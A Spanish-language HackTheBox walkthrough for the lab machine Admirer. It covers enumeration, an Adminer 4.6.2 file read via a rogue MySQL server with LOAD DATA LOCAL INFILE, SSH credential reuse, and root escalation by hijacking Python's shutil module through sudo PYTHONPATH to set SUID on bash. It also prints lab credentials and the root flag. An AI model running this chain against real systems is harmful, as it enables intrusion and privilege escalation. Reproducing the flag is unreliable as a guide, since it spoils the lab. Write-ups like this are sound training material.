---
description: https://app.hackthebox.com/machines/Admirer
---

# Admirer

## Resumen

### Detalles

| Campo                 | Detalle        |
| --------------------- | -------------- |
| **Nombre**            | Admirer        |
| **Sistema Operativo** | Linux          |
| **Plataforma**        | HackTheBox     |
| **Fecha**             | 23/10/2026     |
| **IP Objetivo**       | 10.129.229.101 |

### Executive Summary

Se obtuvo acceso inicial a la máquina Admirer mediante la explotación de Adminer 4.6.2, que permitió recuperar credenciales válidas para SSH. Posteriormente, se aprovechó una configuración insegura de `sudo` y la manipulación de `PYTHONPATH` para escalar privilegios hasta `root`, logrando el compromiso completo del sistema.

### Técnicas

* Information Disclosure
* Arbitrary File Read — Adminer (CVE-2021-43008)
* Python Module Hijacking — PYTHONPATH / sudo SETENV

## Information Gathering

### Port Scanning

```bash
> nmap -n -Pn -p- 10.129.229.101 -oG allPorts
> nmap -sCV -p21,22,80 -Pn 10.129.229.101 -vv -oG allServices
```

#### 10.129.229.101

| Puerto | Servicio | Versión                                       | Notas |
| ------ | -------- | --------------------------------------------- | ----- |
| 21/tcp | ftp      | vsftpd 3.0.3                                  |       |
| 22/tcp | ssh      | OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) |       |
| 80/tcp | http     | Apache httpd 2.4.25 ((Debian))                |       |

### Enumeration

#### Web

```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

El archivo `robots.txt` revela la existencia de `/admin-dir` y sugiere que contiene contactos y credenciales. Este directorio no es accesible de primeras.

A partir de esa pista, se prueban nombres de archivo previsibles relacionados con la información descrita. Se localizan `contacts.txt` y `credentials.txt`, que exponen información sensible:

* `credentials.txt` (contiene credenciales de: un **usuario FTP**, una **cuenta de email interna** y un **administrador de WordPress**).
* `contacts.txt` (contiene un listado de **emails y nombres de trabajadores clasificados por su rol** en la empresa).

**Post FTP**

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Esta captura de pantalla muestra la existencia de `admin_tasks.php` en el directorio `utility-scripts` en el servidor web.

Se procede a realizar una enumeración de archivos en el directorio `utility-scripts`, ya que el backup no coincide con el servidor web actual.

```bash
ffuf -u "http://10.129.229.101/utility-scripts/FUZZ.php" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```

```
info               [Status: 200, Size: 83843, Words: 4024, Lines: 962, Duration: 59ms]
phptest            [Status: 200, Size: 32, Words: 8, Lines: 1, Duration: 52ms]
adminer            [Status: 200, Size: 4296, Words: 189, Lines: 52, Duration: 105ms]
```

Contiene un archivo `adminer.php` no existente en el backup. Adminer 4.6.2.<br>

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Se comprueban los credenciales obtenidos anteriormente relacionados con las bases de datos, pero ninguno es válido; esto se debe a que el backup no era reciente.

#### FTP

Se inicia sesión en el protocolo FTP con los credenciales obtenidos.

```bash
> ftp ftpuser@10.129.229.101
Connected to 10.129.229.101.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

En el servidor se presentan los siguientes dos archivos:

```
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
```

Se descargan para analizar localmente:

```
ftp> get dump.sql dump.sql
ftp> get html.tar.gz html.tar.gz
```

El archivo `dump.sql` se trata de un backup de una simple base de datos que gestiona el contenido de la página web. No se encuentra nada relevante; solo contiene la tabla `items`.<br>

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Se descomprime `html.tar.gz`:

```bash
> gzip -d html.tar.gz
> tar -xf html.tar
```

Contiene los siguientes archivos. Es un backup de la página web; a diferencia de la carpeta `admin-dir`, la carpeta se llama `w4ld0s_s3cr3t_d1r`.

```
drwxr-x--- fran fran  34 B  Thu Jun  6 23:17:00 2019  assets
drwxr-x--- fran fran  22 B  Mon Dec  2 21:29:00 2019  images
drwxr-x--- fran fran  92 B  Mon Dec  2 18:50:56 2019  utility-scripts
drwxr-x--- fran fran  54 B  Mon Dec  2 18:25:49 2019  w4ld0s_s3cr3t_d1r
.rw-r----- fran fran 4.5 KB Tue Dec  3 21:20:11 2019  index.php
.rw-r----- fran fran 134 B  Sun Dec  1 22:31:16 2019 󰚩 robots.txt
```

En el directorio `w4ld0s_s3cr3t_d1r` se encuentran los archivos `credentials.txt` y `contacts.txt`:

* \` (es el mismo archivo que el encontrado en `/admin-dir` en el servidor web, a diferencia de que también consta de unas credenciales bancarias. Esto indica que es un backup antiguo).
* `contacts.txt` (el archivo es exactamente idéntico al anterior.

En la carpeta `/utility-scripts` se encuentran los siguientes archivos:

```
.rw-r----- fran fran 1.8 KB Mon Dec  2 18:48:18 2019  admin_tasks.php
.rw-r----- fran fran 401 B  Sun Dec  1 23:28:45 2019  db_admin.php
.rw-r----- fran fran  20 B  Fri Nov 29 20:32:12 2019  info.php
.rw-r----- fran fran  53 B  Mon Dec  2 18:40:14 2019  phptest.php
```

El archivo `db_admin.php` expone las credenciales de una base de datos (sin confirmar su validez por el momento):

* **Username**: `waldo`
* **Password**: `Wh3r3_1s_w4ld0?`
* **Host**: `localhost`

El archivo `admin_tasks.php` contiene una referencia a un archivo `/opt/scripts/admin_tasks.sh` y, justo encima, su manual de uso.

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Fuera de este directorio, en el _webroot_ del backup, el archivo `index.php` contiene credenciales de una base de datos.

## Explotación

### Foothold

* **Vulnerabilidad:** CVE-2021-43008
* **Procedimiento:**
  1.  Se levanta un servidor de base de datos MySQL en local.

      ```bash
      > sudo mysql -u root
      ```

      ```sql
      CREATE USER 'pepito'@'10.129.229.101' IDENTIFIED BY 'pepito123';
      GRANT ALL ON *.* TO 'pepito'@'10.129.229.101';
      FLUSH PRIVILEGES;
      CREATE DATABASE pepito_test;
      USE pepito_test;
      CREATE TABLE lfr_sink (content TEXT);
      ```
  2.  Se modifica la variable `bind-address` y se añade `local-infile` en `/etc/mysql/mariadb.conf.d/50-server.cnf`. Con esto se configura MySQL para escuchar en todas las interfaces de red de la máquina atacante, permitiendo la conexión desde la máquina objetivo, y se habilita la opción de solicitar archivos del cliente a través de `LOAD DATA LOCAL`.

      ```ini
      [mysqld]
      bind-address = 0.0.0.0
      local-infile = 1
      ```
  3.  Se reinician los servicios MySQL y MariaDB.

      ```bash
      sudo service mysql restart
      sudo service mariadb restart
      ```
  4.  Se ejecuta la consulta `LOAD DATA LOCAL INFILE` para leer el archivo `index.php` que en el backup contenía la contraseña de la base de datos.

      ```sql
      LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE lfr_sink FIELDS TERMINATED BY '\n';
      ```



      <figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>



      <figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>



      ```php
      $servername = "localhost";
      $username = "waldo";
      $password = "&<h5b~yK3F#{PaPB&dA}{H>";
      $dbname = "admirerdb";
      ```

      Se obtienen las credenciales actuales de la base de datos.
  5.  Se procede a realizar la conexión mediante SSH reutilizando las credenciales de la base de datos, debido a que no se encuentra nada relevante en el contenido de esta.

      ```bash
      > ssh waldo@10.129.229.101
      ```



      <figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

      Las credenciales son válidas.

**Evidencia:** `user.txt`

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

### Privesc

* **Vulnerabilidad:** Python Library Hijacking
* **Referencia:** [HackTricks — Linux Privilege Escalation](https://hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)
* **Procedimiento:**
  1.  Se inspeccionan las configuraciones de seguridad y permisos de `sudo`.

      <figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

      El usuario `waldo` puede ejecutar el script `/opt/scripts/admin_tasks.sh` como `root`.<br>
  2.  En el directorio `/dev/shm` se crea un archivo `shutil.py` que contiene la función esperada `make_archive`, configurada para otorgar el bit SUID al binario `/bin/bash`.

      ```python
      import os

      def make_archive(*args, **kwargs):
          os.system('chmod +s /bin/bash')
      ```
  3.  Se ejecuta el script de administración pasando la ubicación `/dev/shm` dentro de la variable `PYTHONPATH`:

      ```bash
      sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh
      ```
  4. Dentro del menú interactivo del script, se selecciona la opción de respaldo de datos (6), para que Python importe la librería falsa `shutil.py` desde `/dev/shm` y ejecute la instrucción `chmod +s /bin/bash` con privilegios de `root`.&#x20;

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

5. Con los permisos SUID asignados a Bash, se accede a la shell de `root` utilizando el parámetro `-p`:

```bash
/bin/bash -p
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

* **Evidencia:** `root.txt (06183a51799d1ca2370e4738287a2891)`

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>



## Información Sensible

### Web

*   `/admin-dir/credentials.txt`&#x20;

    ```
    [Internal mail account]
    w.cooper@admirer.htb
    fgJr6q#S\W:$P

    [FTP account]
    ftpuser
    %n?4Wz}R$tTF7

    [Wordpress account]
    admin
    w0rdpr3ss01!
    ```
*   `/admin-dir/contacts.txt`&#x20;

    ```
    ##########
    # admins #
    ##########
    # Penny
    Email: p.wise@admirer.htb

    ##############
    # developers #
    ##############
    # Rajesh
    Email: r.nayyar@admirer.htb

    # Amy
    Email: a.bialik@admirer.htb

    # Leonard
    Email: l.galecki@admirer.htb

    #############
    # designers #
    #############
    # Howard
    Email: h.helberg@admirer.htb

    # Bernadette
    Email: b.rauch@admirer.htb
    ```

### Backup

* `/w4ld0s_s3cr3t_d1r/credentials.txt`

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

* `/utility-scripts/db_admin.php`&#x20;

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
